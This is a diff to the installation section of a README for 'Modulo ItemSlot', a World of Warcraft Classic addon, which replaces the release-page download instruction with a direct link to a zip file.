@@ -9,7 +9,7 @@ A lightweight, configurable equipment-slot and trinket swap bar for World of War
 
 ## Installation
 
-1. Download `Modulo-ItemSlot-1.0.0.zip` from the GitHub release.
+1. Download Modulo ItemSlot 1.0.0 (https://github.com/moonlitfarewell/modulo-itemslot-releases/raw/refs/heads/main/Modulo-ItemSlot-1.0.0.zip).
 2. Extract the `ModuloItemSlot` folder into your WoW `_classic_era_/Interface/AddOns/` directory (use the AddOns directory for your client installation).
 3. Ensure the folder layout is `.../AddOns/ModuloItemSlot/ModuloItemSlot.toc`.
 4. Enable **Modulo ItemSlot** in the AddOns list. Ensure MODULO is also enabled.
